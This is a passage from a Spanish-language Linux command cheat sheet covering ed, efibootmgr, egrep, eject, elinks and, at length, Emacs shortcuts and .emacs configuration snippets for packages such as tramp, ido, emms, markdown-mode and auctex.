	Q (Igual que el anterior, sin comprobar si el fichero actual fue grabado)
	P (Activa /Desactiva el prompt del editor)
	H (Activa/Desactiva los mensaje explicativos de error)
	u (Deshace el último comando que puede deshacerse. Por ejemplo una inserción)
	!orden (Ejecuta la orden especificada llamando al intérprete de comandos sin salir del editor)
	+5 (Avanza 5 líneas o una por defecto desde la línea actual)
	-4 (Retrocede 4 líneas o una por defecto desde la línea actual)
	^d (Vuelve al modo orden)
	g/cosa/n (Busca "cosa" y vusualiza la linea [n])
	G/cosa/ (Se posiciona una a una en todas las líneas dónde ha encontrado "cosa" y espera una orden o "intro" para continuar)
	v/cosa/n (Busca las líneas que no contengan la expresión "cosa" y las visualiza)
	V/cosa/ (Se posiciona en cada linea donde no ha encontrado "cosa" [todas por defecto] a espera de una orden o "intro" para continuar)
	s/cosa/casa/[g] (Busca las líneas que contienen "cosa" y substituye "cosa" por "casa"


efibootmgr
Averiguar si se está ejecutando UEFI o BIOS. Si el sistema es compatible con UEFI generará diferentes variables. En caso de no ser compatible con UEFI se verás un mensaje que dice que las variables no son compatibles.
	# efibootmgr
	EFI variables are not supported on this system.
Tambien puede consultarse si exite en el sistema la carpeta /sys/firmware/efi, si no existe se está usando BIOS.


egrep
[extended grep]. Busca expresiones regulares.
	$ egrep -v '^$|^#' archivo (suprimir lineas en blanco y comentadas)
	$ egrep -c '^#' /etc/fstab (Muestra el número de lineas comentadas)
$ egrep -in "palabra" *.txt (busca “palabra” en todos los .txt del directorio)
$ egrep 'UUID|proc' /etc/fstab (Muestra las lineas con las coincidencias)
$ egrep --color '(vmx|svm)' /proc/cpuinfo (Averiguar si el equipo  admite la virtualización por hardware. Si el comando no devuelve nada es porque no lo soporta)
Otras opciones:
	-h 	Muestra las líneas coincidentes pero no los nombres de archivo.
	-i 	Ignora los cambios mayúsculas y minúsculas.
	-n 	Muestra la línea y el número de línea.
	-r 	Lee en todos los archivos de los directorios y subdirectorios.
	-v 	Muestra todas las lineas que no coinciden.
	-w      Sólo coincidencia en palabras completas.


eject
Abre/cierra la bandeja del cdrom
$ eject /dev/cdrom0    (Abre)
$ eject -t /dev/cdrom0   (Cierra)
$ eject /dev/cdrom; sleep 1; eject -t /dev/cdrom  (abrirlo y cerrarlo)
$ eject sda8 (desmonta la partición mencionada)


electricsheep
salva pantallas (screen saver) de arte abstracto en el que colaboran miles de personas en el mundo. Cuando los equipos "sueñan" ElectricSheep se enciende y comunica su ordenar con los demás a través de Internet para crear animaciones abstractas conocidas como "ovejas". Para que salga como opción en xscreensaver:
$ nano .xscreensaver
Añadir la linea al final del apartado:
	....
	- GL:                           companioncube -root                         \n\
	- GL:                           hilbert -root                               \n\
	- GL:                           tronbit -root                               \n\
	                                unicode -root                               \n\
                                	electricsheep                               \n\
Nota.- Los videos se encuentran en ~/.electricsheep en formato .avi


elinks
Navegador.
$ elinks -dump fichero.html > fichero.txt  (Convierte un .html a .txt)
Atajos:
	Esc (Ver/esconder los menús. Tambien F9)
	t (nueva pestaña)
	g (Entrar nueva url)
	< > (moverse entre pestañas a derecha o izquierda)
	Flechas del cursor derecha/izquierda (pagina anterior/posterior)


emacs
Tutorial completo en español: <http://www.nongnu.org/emacs-man-es/> . Mucho más que un editor [no un procesador]. Lo que sigue es un pequeño manual de primeros auxilios.
Cuando Emacs abre un archivo lo abre en un buffer. Cuando leemos un fichero, lo que hacemos es copiar su contenido a una zona de memoria [a un buffer] y durante la edición lo que modificamos es esa zona de memoria, el fichero como tal permanece inalterado hasta que explícitamente demos la orden de grabar en el disco las modificaciones. Cuando emacs se inicia se abren dos búffers que no están asociados a ningún fichero: *scratch* y *messages* [En ambos el nombre empieza y acaba por un asterisco, lo que indica que no es un búffer asociado a un fichero]
$ emacs -q (Arrancar emacs prescindiendo del archivo de configuracion)
$ emacs --daemon (Iniciar emacs como demonio y a continuacion con emacsclient conectar con el servidor)
$ emacsclient -c (Conectar con el servidor)
Significado de algunas teclas en la terminologia de emacs:
	Alt = M (meta)
	Crtl= C (control)
	spc (Barra espacio)
	RET (intro)
	RETRO (retroceso)
$ emacs -nw (Lanzar emacs en consola. Para crear un alias: alias emacs='emacs -nw')
$ emacs -nw --debug-ini (Modo debuger para comprobar errores de sintaxis en ~/.emacs)
$ emacs -u usuario (Arrancar emacs con la configuración de otro usuario)
$ emacs -Q -q -nw -f eshell (Iniciar eshell en una nueva sesión de Emacs en la terminal sin cargar init.el)
Teclas de socorro:
	C-g (Cancelar algo: un comando, una combinación de teclas...)
	C-x u (Deshacer)
	M-x revert-buffer (Deshacer todo desde la última vez que se guardó)
	M-x recover-session (Recuperar archivos perdidos por un fallo del sistema)
Movimiento por el texto:
	C-a (ir al comienzo de una línea)
	C-e (ir al final de una línea)
	C-f (un caracter hacia adelante)
	C-b (un caracter hacia atrás)
	M-f (una palabra hacia adelante)
	M-b (una palabra hacia atrás)
	C-n (ir ala siguiente línea)
	C-p (ir a la línea anterior)
	M-a (Ir al inicio de la frase)
	M-e (Ir al final de la frase)
	C-v (Pagina siguiente)
	M 8 C-v (baja 8 lineas la pantalla, NO 8 PÁGINAS)
	M-v (Pagina anterior)
	M 8 M-v (Sube 8 lineas la pantalla, NO 8 PÁGINAS)
	M-< (Ir al principio del texto)
	M-> (Ir al final del texto)
	M-g g (Ir a la linea)
	C-l (Redibuja la pantalla. La primera vez que se pulsa, coloca la linea del cursor en el centro, la segunda arriba y la tercera abajo)
Salir:
	C-x C-c (Salir de Emacs)
	C-x C-s (Guardar sin salir)
	C-x C-w (Salir y guardar como)
	C-x s (Guardar todos los ficheros abiertos. Preguntará.)
Copiar, cortar, pegar y reemplazar
	C-Esp (Inicio del marcado de texto)
	C-x h (Marcar todo el buffer, "Seleccionar todo")
	M-w (Copiar)
	C-w (Cortar)
	C-y (Pegar)
	C-x C-t (Copiar linea)
	M-h (Selecciona un párrafo)
	M-% (Primero entrar la palabra a cambiar i despues la que sustituye)
Buscar:
	C-s (busca hacia adelante)
	C-r (busca hacia atras)
	C-s C-s (repite la busqueda)
Borrar:
	M-d (Palabra despues del cursor)
	M 3 M-d (Borra 3 palabras)
	C-k (del cursor a fin de linea)
	M 3 C-k (Borra 3 lineas)
	M-k (todo el párrafo)
	M 3 M-k (Borra 3 párrafos)
	M-x kill-whole-line (Borrar la linea con independencia del lugar del cursor)
Ventanas:
	C-x 2 (división horizontal de la ventana en dos)
	C-x 3 (división vertical de la ventana en dos)
	C-x 1 (Deja solo la ventana activa abierta)
	C-x o (cambiar de ventana)
	C-x 0 (Eliminar ventana actual)
	C-x } (alarga la ventana activa en dirección horizontal)
	C-x { (La acorta en dirección horizontal)
	C-x ^ (La alarga en dirección vertical)
Buffers:
	C-x k (cierra la buffer actual. Pide confirmación)
	C-x b (Cambiar de buffer)
	C-x C-b (Listar buffers en un panel)
	C-x flechas derecha/izquierda (cambiar al siguiente/anterior)
Marcas:
	C-x r m (Solicita nombre para la linea marcada)
	C-x r b a (Ir a la linea marcada con el nombre que entremos, en este caso la "a". Si se encuentra la marca en un archivo no abierto, se abrirá)
	C-x r l (Lista todas las marcas)
	M-x bookmark-delete (Eliminar una marca que entremos)
	C-spc C-spc (marca el punto del cursor en el texto)
	C-u C-spc (Va a la marca realizada con C-spc C-spc)
	C-x C-spc (Va a la penultima marca realizada con C-spc C-spc)
Imprimir:
	C-u M-x ps-print-buffer-with-faces (Imprimir a ps. Luego con ps2pdf pasar a pdf)
	M-x  print-buffer (Imprimir archivo con numeración y cabeceras)
	M-x  lpr-buffer (Imprimir sin numeración ni cabeceras)
	M-x  print-region (Imprimir trozo seleccionado con numeración y cabeceras)
	M-x  lpr-region  (Imprimir trozo seleccionado sin numeración ni cabeceras)
Varios:
	C-x C-f (brir un archivo)
	C-o (Inserta linea en blanco a continuación del cursor)
	M-x tetris (Listado de juegos en /usr/share/emacs/24.3/lisp/play/. Lanzar sin la extensión)
	M-x help-with-tutorial-spec-language (abre buffer con los idiomas disponibles para el manual)
	C-x d (Abre un directorio que se especifique)
	C-x RET f (Entrar codificación de caracteres: iso-8859-1, utf-8..)
	C-x custom (Personalizar numerosos aspectos de emacs)
	C-x C-+ (Agrandar la fuente)
	C-x C-- (Disminuir la fuente)
	C-x z z z (Repite el último comando tantas veces como "zetas" pongamos. En este caso 3 veces )
	& (Teniendo el cursor sobre un archivo en dired, permitirá entrar una aplicación para abrirla)
	C-x C-o (Sólo deja una linea en blanco)
Entrar comandos de shell e insertar:
	C-z (Suspende la sesion emacs y entra en la shell. Volver a emacs con fg o con %emacs)
	M-! (Muestra en el mini buffer un mensaje para entrar un comando y lo abre un una ventana)
	C-u M-! (Inserta la salida del comando en la posición del cursor)
	C-x i (Insertar archivo en la posición del cursor)
	C-c C-l (Mostrar historial de comandos)
	C-u M-x eshell (Lanzar otra eshell cuando ya existe una)
ayuda:
	F10 (Abre la ayuda general)
	C-h k (Muestra información sobre un atajo)
	C-h a (Todas las opciones de un comando)
	C-h b (Ver todos los atajos)
	C-h w (Muestra el atajo de la función que entremos)
	C-h f (Información sobre una función)
	C-h C RET (Muestra información sobre las codificaciones)
	C-h v (Muestra información sobre variables)
	C-h C-h (Muestra ayuda de la ayuda)
    C-h e (Muestra los mensajes de log)
    C-h v package-activated-list (Muestra las extensiones instaladas si lo han sido por "package")
Modo comando:
	M-x recover file (levantar respaldo del archivo)
	M-x apropos INTRO print (Muestra información de "print")
	M-x list-faces-display (Ver lista y muestra de los estilos disponibles)
		M-x w3m-browser-url (Pedirá url para conectar. Precisa w3m-el)
	M-x browse-url-firefox (Abrir una url con firefox)
	M-x global-linum-mode (Mostras/esconder números de linea)
	M-x global-visual-line-mode (Cortar/no cortar palabras al final de la pantalla)
	M-x global-hl-line-mode (Resaltar la linea donde está el cursor)
	M-x calendar (Mostrar mes actual, el anterior y el posterior)
	M-x command-history  (History de comandos entrados)
	M-x calculator (Calculadora muy elemental)
	M-x man (mostrar man de un comando)
	M-x woman (mostrar man de un comando)
	M-x set-buffer-file-coding-system (Entrar codificación para el presente bufer)
	M-x global-whitespace-mode (Mostrar/ocultar caracteres no imprimibles)
	M-x follow-mode (al dividir un buffer en dos pantallas [C-x 3] y activar este modo menor, hace que los paneles sean uno continuación del otro)
	M-x man-follow (Con el cursor sobre un comando linux, muestra la página de manual)
	M-x font-lock-mode (activa/desactiva coloreado de sintasxis. Por defecto activado.)
	M-x append-to-buffer (sobre una sección seleccionada, la manda a otro buffer)
	M-x proced-toggle-auto-update (Visualizar procesos del sistema [como top])
Para hacer permanente cualquiera de las opciones anteriores, colocarla en ~/.emacs de la siguiente forma:
   	(global-set-key (kbd "<f7>") 'global-linum-mode)
Para mostrar u ocultar los numeros de linea pulsando F7
1.-
Abrir navegador de archivos. Precisa tenerlo instalado
Instalar nav:
Descarga de <http://code.google.com/p/emacs-nav/>. Una vez descomprimido copiar el directorio en ~/.emacs.d/ y renombrar como nav
$ emacs .emacs
Completar configuración y que se abra pulsado F8, añadir las siguientes lineas:
	(add-to-list 'load-path "/home/USER/.emacs.d/nav/")
    (require 'nav)
    (nav-disable-overeager-window-splitting)
    (global-set-key [f8] 'nav-toggle)
Abrir con M-x nav
2.-
Añadir una "lista negra" de bufferes a los que no interesar acceder (scratch, messages...).
Añadir a .emacs las siguientes lineas:
	(require 'iswitchb)
	(iswitchb-mode)
	(add-to-list 'iswitchb-buffer-ignore "^ ")
	(add-to-list 'iswitchb-buffer-ignore "*Messages*")
	(add-to-list 'iswitchb-buffer-ignore "*ECB")
	(add-to-list 'iswitchb-buffer-ignore "*Buffer")
	(add-to-list 'iswitchb-buffer-ignore "*Completions")
	(add-to-list 'iswitchb-buffer-ignore "*scratch*")
	(add-to-list 'iswitchb-buffer-ignore "*ftp ")
	(add-to-list 'iswitchb-buffer-ignore "*bsh")
	(add-to-list 'iswitchb-buffer-ignore "*jde-log")
	(add-to-list 'iswitchb-buffer-ignore "^[tT][aA][gG][sS]$")
Al pulsar C-x b (Listar buffers abiertos) El buffer que aparece en primer lugar, resaltado en otro color, es el que se mostrará al pulsar Enter. Si queremos cambiar a otro buffer pulsar C-s para rotar el orden de los elementos de la lista.
Nota.- A partir de la versión emacs-24.4 iswitchb ha sido substituido por ido. Las lineas a añadir a .emacs son:
	(require 'ido)
	(ido-mode 'buffers) ;; only use this line to turn off ido for file names!
	(setq ido-ignore-buffers '("^ " "*Completions*" "*Shell Command Output*"
	                           "*Messages*" "Async Shell Command" "*scratch*"
	                           "*tramp*"))
3.-
Escuchar música con emms.
Instalar emms en el sistema mediante repositorio y descargar <http://ftp.gnu.org/gnu/emms/> , descomprimir y mover el directorio a ~/.emacs.d/. En .emacs colocar las lineas:
	(add-to-list 'load-path "~/.emacs.d/emms-4.0/")
	(require 'emms-setup)
	(emms-standard)
	(emms-default-players)
Llamar com M-x emms (Pulsando TAB apareceran las opciones). Salir con M-x emms-stop
4.-
Corrector ortográfico. apt-get install aspell-es dictionary-el aspell-ca
Emacs coge automaticamente el idioma por defecto del sistema. Para modificar el idiome:
	M-x ispell-change-dictionary
Corregir un texto:
	M-x ispell
Opciones en este modo:
	ESP (Saltar la palabra)
	r (modificar personalmente)
	dígito (Substituir palabra por la del dígito pulsado)
	a (Aceptar la palabra incorrecta)
	i (incorporar palabra al diccionario personal)
	C-g (Salir de corrección. Con C-u M-$ vuelve a corrector)
	q (Salir de corrector)
	C-l (Actualizar pantalla)
Corregir un texto en tiempo real:
	M-x flyspell-mode
Opciones en este modo:
	M-$ (Sobre la palabra mal escrita para ver opciones)
Tambien podemos activar por defecto las correcciones añadiendo en .emacs:
	(setq-default flyspell-mode t)
Para los comentarios en los lenguajes de programación:
	M-x flyspell-prog-mode
Para los comentarios en modo latex añadir en .emacs:
	(add-hook 'LaTeX-mode-hook 'flyspell-mode)
5.-
Recargar archivo de configuración .emacs despues de una modificación:
	M-x load-file (Cuando solicite el nombre del archivo colocar .emacs)
	M-x eval-buffer (Si el archivo .emacs se encuentra en un buffer)
6.-
Conectar a un servidor ssh:
Descargar tramp de <http://ftp.gnu.org/gnu/tramp/> descomprimir y mover la carpeta al directorio ~/emac.d/ . En el archivo de configuración .emacs añadir las lineas:
	(require 'tramp)
	(setq tramp-default-method "ssh")
Y si queremos activar variables para debuggear problemas añadir:
	(setq tramp-debug-buffer t)
	(setq tramp-verbose 10)
Abrir sesión de emacs y acceder al host remoto empleando alguno de los siguientes metodos según nuestro /etc/hosts:
	C-x C-f /ssh:USER@host_remoto:/home/USER/
	C-x C-f /USER@host_remoto:/home/USER
	C-x C-f /host_remoto:/home/USER
Y si el puerto es distinto del 22, añadiendo a las opciones anteriores #puerto al estilo:
	C-x C-f /ssh:USER@host-remoto#2222:/home/USER
Pedirá contraseña.
Nota.- Después de pulsar el atajo, no olvidar borrar la referencia al directorio local ~/ dejándolo en /
7.-
Temas de colores:
Descargar el paquete tar.gz de:  <http://download.gna.org/color-theme/>
Una vez decomprimido mover la carpeta a ~/.emacs.d:
	~/.emacs.d/color-theme
Y añadir a .emacs las lineas:
	(add-to-list 'load-path (expand-file-name "~/.emacs.d/color-theme/"))
	(require 'color-theme)
	(color-theme-initialize)
Arrancar emacs y:
	M-x color-theme-select
Mostrará en un nuevo buffer una lista de temas disponibles que podrán probarse seleccionandolos con "intro" o la tecla "i". Una vez escogido el tema, pulsando la letra d, muestra la linea que ha de entrarse en .emacs. Supongamos que escogemos Charcoal Black, añadiremos la linea (color-theme-charcoal-black) quedando toda la entrada:
	(add-to-list 'load-path (expand-file-name "~/.emacs.d/color-theme/"))
	(require 'color-theme)
	(color-theme-initialize)
	(color-theme-charcoal-black)
Otros comandos reelacionados con colores:
	M-x set-foreground-color (Pedirá color para las fuentes).
	M-x set-background-color (Pedirá color para el fondo)
	M-x set-face-foreground (Afinar más el color de las fuentes según modos)
	M-x set-face-background (Afinar más el color de fondo según modos))
	M-x list-colors-display (Listado, muestra y código de colores disponibles)
8.-
Consultando directorios: dired, navegador de archivos de emacs [C-x d].
	g (Despues de una modificación actualiza la pantalla)
	v (Muestra el archivo en modo solo-lectura
	q (Regresa al listado)
	e [enter] (Editar el archivo)
	d (Marca un archivo para su eliminación colocando una "D" en la 1ª columna)
	u (Elimina la marca anterior)
	x (Elimina los archivos marcados con una "D")
	D (Eliminación inmediata)
	C (Copiar)
	3C (Copiar el archivo de la linea del cursor y los 3 siguientes)
	R (Renombrar o mover)
	Z (Comprimir descomprimir [compress (.z .Z) y gzip (.gz)])
	X (Entrar comandos de shell [chmod, grep, find, sort ...])
	+ (Crear directorio)
	** (Marcar todos los ejecutables)
	*/ (Marca todos los directorios)
	*! (Desmarca todo)
	M (Cambiar los permisos. Sólo poner la numeración [777, 755...])
	O (Cambiar el propietario)
	P (Imprimir el fichero. El comando lp imprimirá con la impresora predeterminada)
	h (Muestra la ayuda y todos los atajos de teclado)
	S (Crear un enlace simbólico)
Tambien es posible mostrar/ocultar detalles con: M-x dired-hide-details-mode
9.-
M-x term [Emulador de terminal]
Utiliza dos modos de entrada: El modo caracter que envia cada caracter de entrada directamente a la subshell, a excepción del carácter de escape [C-c] y el modo línea que actúa como modo Shell [Permite entrada de todas las combinaciones de teclas emacs, desplaza el cursor por la pantalla con las flechas, puede marcarse trozos de texto para copiar...]. Para alternar entre estos dos modos:
	C-c C-j (Cambia a modo línea)
	C-c C-k (Cambia a modo caracter)
Nota.- Puede que para alternar entre modos sea preciso hacerlo con M-x term-mode
Algunos detalles:
	Para substituir el nombre *terminal* por otro: M-x rename-buffer
	Consultar el historial de comandos con M-p (Hacia atras) y M-n (Hacia adelante)
10.-
Uso de sudo. Los mismos ejemplos sirven para su. Precisa tramp [ver ssh]. Entrar el siguiente código en .emacs autoexplicativo:
	;; Uso de sudo: C-x C-f /sudo::/etc/hosts
	;; C-x C-f /sudo:root@localhost:/etc/hosts  o C-x sudo-find-file
	(defun sudo-find-file (file-name)
	  "Like find file, but opens the file as root."
	  (interactive "FSudo Find File: ")
	  (let ((tramp-file-name (concat "/sudo::" (expand-file-name file-name))))
	  (find-file tramp-file-name)))
	;; Atajo de teclado para sudo:
	(global-set-key (kbd "C-x F") 'sudo-find-file)
11.-
Abrir archivos de dired con aplicaciones externas pulsando F8:
Copiar en .emacs el siguiente código:
	(defun external-app ()
	 "In dired, open the file named on this line."
	  (interactive)
	  (let* ((file (dired-get-filename nil t)))
		(call-process "xdg-open" nil 0 nil file)
	(global-set-key (kbd "<f8>") 'external-app)
12.-
Abrir archivos de dired con determinadas aplicaciones externas:
Descargar la libreria de <http://stud4.tuwien.ac.at/~e0225855/misc/openwith.el> y moverlo a la carpeta ~/.emacs.d/
Y copiar el siguiente codigó en ~/.emacs:
	(add-to-list 'load-path "~/.emacs.d/openwith.el")
	(require 'openwith)
	(setq openwith-associations '(("\\.pdf\\'" "evince" (file))))
	(setq openwith-associations '(("\\.flv\\'" "vlc" (file))))
	(openwith-mode t)
Colocar tantas lineas del tipo "(setq openwith-associations '(("\\.flv\\'" "vlc" (file))))" como archivos queramos asociar.
13.-
Algunos ajustes en el prompt de eshell que pueden incorporarse al archivo .emacs:
Modificar el prompt para mostrar el directorio de trabajol. Para mostrar el usuario: (concat (getenv "USER")
	(setq eshell-prompt-function
	(lambda nil
	(concat (eshell/pwd)
	(if (= (user-uid) 0) " # " " $ "))))
Usar bash en lugar de la shell de emacs:
	(setq shell-file-name "/bin/bash")
Modificar el mensaje de bienvenida al entrar en eshell:
	(setq eshell-banner-message "\n... entrant a  emacs shell...\n\n")
Incorporar colorines a las salidas de los comandos:
	(add-hook 'shell-mode-hook 'ansi-color-for-comint-mode-on)
Nota.- Si ya tenemos una terminal [eshell o term] abierta no permite abrir ninguna más a menos de que le cambiemos el nombre:
	M-x rename-buffer
14.-
Para poder copipastear de emacs a las X y viceversa colocar en .emacs el código:
	;; http://hugoheden.wordpress.com/2009/03/08/copypaste-with-emacs-in-terminal/
	(setq x-select-enable-clipboard t)
	(unless window-system
 	(when (getenv "DISPLAY")
 	(defun xsel-cut-function (text &optional push)
    (with-temp-buffer
    (insert text)
    (call-process-region (point-min) (point-max) "xsel" nil 0 nil "--clipboard" "--input")))
 	(defun xsel-paste-function()
    (let ((xsel-output (shell-command-to-string "xsel --clipboard --output")))
    (unless (string= (car kill-ring) xsel-output)
        xsel-output )))
    (setq interprogram-cut-function 'xsel-cut-function)
    (setq interprogram-paste-function 'xsel-paste-function)))
15.-
Operar con trozos seleccionados [C-espacio]
	C-x r s (copy-to-register) Ponerle un nombre y guardarla en un registro
	C-x r i (insert-register) Insertará el registro que le indiquemos
	M-x view-register (ver el contenido de un registro)
16.-
Disponer de un bloc de notas (M-x remember) en emacs que se lance con C-c &
$ cd ~/.emacs.d
$ git clone git://repo.or.cz/remember-el.git remember
Colocar en la configuración:
$ nano .emacs
Añadir las lineas:
	(add-to-list 'load-path "~/.emacs.d/remember")
	(require 'remember)
	(global-set-key (kbd "C-x &") 'remember)
Una vez entrado el texto pulsar C-c C-c para poner la fecha. Se guardan todas las notas en el fichero ~/.notes
17.-
Reemplazar texto:
M-x query-replace [M-x %] (Busca y pregunta antes de substituir)
Algunas opciones del comando:
	y (Reemplazar la coincidencia actual)
	n (No reemplazar la coincidencia actual)
	q (Reemplazar la coincidencia actual y salir)
	C-r (Ir al editor recursivo)
	! (Reemplazar todo)
	^ (Ir al anterior reemplazo)
	E (Editar la norma de reemplazo
M-x replace-string (Busca y reemplazar sin preguntar)
18.-
Instalar extensiones de emacs a partir de repositorios. Descargar el archivo package.el:
[package.es](http://repo.or.cz/w/emacs.git/blob_plain/1a0a666f941c99882093d7bd08ced15033bc3f0c:/lisp/emacs-lisp/package.el)
Y copiarlo en .emacs.d/
Colocar en .emacs las lineas:
	(add-to-list 'load-path (expand-file-name "~/.emacs.d/package.el"))
	(require 'package)
	(package-initialize)
	(setq package-archives '(("gnu" . "http://elpa.gnu.org/packages/")
	                         ("marmalade" . "http://marmalade-repo.org/packages/")
	                         ("melpa" . "http://melpa.milkbox.net/packages/")))
Teclas de control:
	M-x describe-mode (Listado de teclas de control)
	M-x package-list-package (Recargar la lista de paquetes)
	M-x package-menu-mode (Entrar en modo package)
Una vez entrado en el modo package:
	enter (muestra una descripción del paquete)
	i (Marcar para instalar)
	u (Desmarcar)
	d (Marcar para eliminar)
	x (Instalar o desinstalar un paquete)
	r (Resfrescar el listado)
19.-
Modo markdown. Descarga de la extensión: git clone git://jblevins.org/git/markdown-mode.git y colocar en .emacs.d/
	(add-to-list 'load-path "~/.emacs.d/markdown-mode")
	(autoload 'markdown-mode "markdown-mode" t)
	(add-to-list 'auto-mode-alist '("\\.markdown\\'" . markdown-mode))
	(add-to-list 'auto-mode-alist '("\\.md\\'" . markdown-mode))
Algunos atajos
	M-x markdown-mode (Entrar en modo markdown)
	C-c C-t 1 (fuente de mayor tamaño. Números de 2 al 6 ir decreciendo el tamaño)
	C-c C-h (Visualizar todas los comandos disponibles)
	C-c C-a l (insertar link con la forma [texto](URL))
	C-c C-a u (Insertar url)
	C-c C-c p (Ver la versión html del texto en pantalla y visualizarla en el navegador)
	C-c C-c L (insertar link referenciado)
	C-c C-c v (Visualizar la página en el navegador y exportar archivo a html)
	C-c - (Insertar linea)
	C-c C-c e (Exportar archivo a formato html con el mismo nombre)
	C-c C-x m (Insertar listado)
	C-c C-s b (Insertar cita)
	C-c C-s c (Insertar código)
	C-c C-s p (Insertar literal)
	C-c TAB i (Insertar imagen en formato: [texto](url))
20.-
Algunos atajos para el navegador w3m:
	B (w3m-view-preview-page) Ir a la pagina anterior
	N (w3m-view-next-page) Ir a la página siguiente
	I (w3m-view-image) Ver imagen con una aplicación externa
	A (w3m-bookmark-add-current-url) Afegir la url activa a les adreces d'interès
	M-a (w3m-bookmark-add-this-url) Afegir una url a les adreces d'interès
	v (w3m-bookmark-view) veure les adreces d'interès
	E (w3m-bookmark-edit) (Visitar l'arxiu de les adreces d'interès)
	C-k (w3m-bookmark-kill-entry) (Treure una url de les adreces d'interès)
21.-
Dando un pequeño formato a un texto (enriched-mode)
	M-x enriched-mode (Activa/desactiva el modo enriquecido)
	M-o d (por defecto)
	M-o b (negrita)
	M-o i (cursiva)
	M-o l (negrita y cursiva)
	M-o u (subrallado)
	M-x facemenu-set-foreground (cambiar el color de la letra del texto marcado y de lo que se escriba a continuación)
	M-x facemenu-set-background (cambiar el color de fondo del texto marcado y de lo que se escriba a continuación.
	M-x find-file-literally (abrir el fichero "literalmente" sin el modo "enriched" pero viendo los comandos de formato)
22.-
Algunas opciones posibles al listar buffer con C-x C-b
	n (siguiente buffer de la lista)
	p (buffer anterior de la lista)
	d (marcar buffer para eliminación)
	% (marcar o desmarcar buffer como sólo lectura)
	m (marcar buffer para ser mostrado)
	u (desmarcar buffer)
	Del (desmarcar buffer marcado con "u")
	o (reemplazar la otra ventana con el buffer actual)
	1 (mostrar buffer en pantalla completa)
	2 (mostrar los siguientes 2 buffers en ventana horizontal)
	v (mostrar los buffers marcados por "m")
	x (ejecutar comandos de marcado)
	q (salir del listado de buffers)
23.-
Algunas opciones al listar marcadores (C-x r l)
	d (marcar para eliminar)
	x (Ejecutar la eliminación)
	r (cambiar nombre del marcador)
	s (guardar listado)
	f (mostrar el marcador)
	t (Mostrar/ocultar la ruta a los ficheros)
	q (salir)
24.-
Grabar macros
	C-x ( (Empezar a grabar secuencia de caracteres)
	C-x ) (Terminar la grabación)
	C-x e (Reproducir la macro grabada)
Si quremos un atajo para reproducir la última macro grabada con, por ejemplo Mayuscula F1, colocar en .emacs:
	(global-set-key [(shift f1)] 'call-last-kbd-macro)
25.-
Algunos atajos de latex-mode, auctex y reftex
        C-c TAB (Página info de auctex)
        C-c * (Selecciona la sección actual)
        C-c ' (Marca como comentario todo el párrafo)
        C-c ; (Marca como comentario toda la zona previamente seleccionada)
        C-c : (Elimina comentarios de la zona previamente seleccionada)
        C-c " (Elimina comentario de una linea)
        C-c { (Inserta aturomaticamente las llave de apertura y de cierre)
        C-c ] (Cierra un entorno)
        C-c C-e (insertar automática el par de órdenes de apertura y cierre de un entorno)
        ESC TAB (Autocompletado al empezar una etiqueta con \)
        C-c C-m (al empezar a teclear el nombre del macro lo autocompleta y lo inserta
        M-C-a (Va a la línea de apertura del entorno actual)
        M-C-e (Va a la línea de cierre del entorno actual)
        C-u (Sustituye el formato actual por el que se indique)
        C-c C-s (Preguntará por tipo de unidad a insertar. Por defecto igual que la actual)
        C-u C-c C-s (sugerirá el nivel inmediatamente inferior al actual)
Especificación de formatos para letras:
        C-c C-f C-r (\textrm{} Inserta texto roman)
        C-c C-f C-f (\textsf{} Inserta texto sanserif)
        C-c C-f C-t (\texttt{} Inserta texto tipo máquina de escribir)
Especificación por trazo e inclinación:
        C-c C-f C-b (\textbf{} Inserta texto en negrita (trazo grueso))
        C-c C-f RET (\textmd{} Inserta texto normal (trazo medio))
        C-c C-f C-i (\textit{} Inserta texto en cursiva)
        C-c C-f C-s (\textsl{} Inserta texto inclinado)
        C-c C-f C-e (\emph{} Inserta texto enfatizado)
Otras especificacion es de formato:
	C-c C-f C-u (\textup{} Inserta texto de perfil recto)
        C-c C-f C-c (\textsc{} Inserta texto en versales)
        C-c C-f C-n (\textnormal{} Inserta texto normal)
        C-c C-f C-d (Borra la especificación de formato actual)
        C-c C-q C-r (Indentar párrafo seleccionado)
        C-c C-q C-p (Reformatea un párrafo a 70 caracteres por linea)
Activando el modo menor "outline" (M-x outline-minor-mode) podemos acceder a los siguientes atajos:
        C-c @ C-t (Pliega las secciones)
        C-c @ C-a (Despliega las secciones)
        C-c @ C-n (Próximo título)
        C-c @ C-p (Título anterior)
        C-c @ C-f (Próximo título del mismo nivel
        C-c @ C-b (Anterior título del mismo nivel)
        C-c @ C-u (Título del nivel inmediatamente superior)
Ver estructura del documento (M-x reftex-mode):
        C-c = (Abre un ventana con la estructura del documento)
Algunas teclas disponibles en esta ventana en reftex-mode:
        ? (Muestra sumário y opciones disponibles)
        q (Cierra la ventana)
        k (Cierra ventana y elimina el buffer)
        ESP (Muestra en la otra ventana lo seleccionado)
        f (Activa/desactiva mostrar donde estamos en la otra ventana en tiempo real)
        TAB (Movernos a la otra ventana correspondiente al título seleccionado)
        RET (Oculta la ventana del indice y el cursor va al título seleccionado)
        g (Actualizar el buffer)
Referencia a las etiquetas:
        C-c ) (Abre una ventana con las referencias)
Algunas teclas disponibles en la ventana de etiquetas:
        RET (buscar etiquetas de todo tipo)
        e (buscar etiquetas de tipo equation)
        f (buscar etiquetas de tipo figure)
        i (buscar etiquetas de tipo enumerate)
        n (buscar etiquetas de tipo footnote)
        N (buscar etiquetas de tipo endnote)
        s (buscar etiquetas de tipo section)
        t (buscar etiquetas de tipo table)
Una vez escogida las etiquetas a mostrar se abre una ventana con las siguientes opciones:
        ? (Muestra opciones disponibles)
        q (Cierra el buffer)
        s (Cambia el tipo de etiqueta que se está buscando)
        SPC (Mostra en la otra ventana lugar de la etiqueta seleccionada)
        f (Activa/desactiva mostrar donde estamos en la otra ventana en tiempo real)
Comandos externos.
        C-c C-c (La primera vez que se ejecuta, compila. La segunda muestra el pdf)
        C-c C-v (Mostrar directamente el pdf)
        C-c C-w (Activa/desactiva mostrar como error desbordamientos de cajas de texto)
        C-c ` (Muestra la linea en la que se produce un error)
26.-
Función que abre en firefox una url, un link o una imagen sobre la que se encuentra el cursor en un archivo de texto pulsado C-c b:
	(defun w3mext-open-link-or-image-or-url ()
	    (interactive)
	    (let (url)
	    (if (string= major-mode "w3m-mode")
	        (setq url (or (w3m-anchor) (w3m-image) w3m-current-url)))
	        (browse-url-generic (if url url (car (browse-url-interactive-arg "URL: "))))
	        ))
	(global-set-key (kbd "C-c b") 'w3mext-open-link-or-image-or-url)
27.-
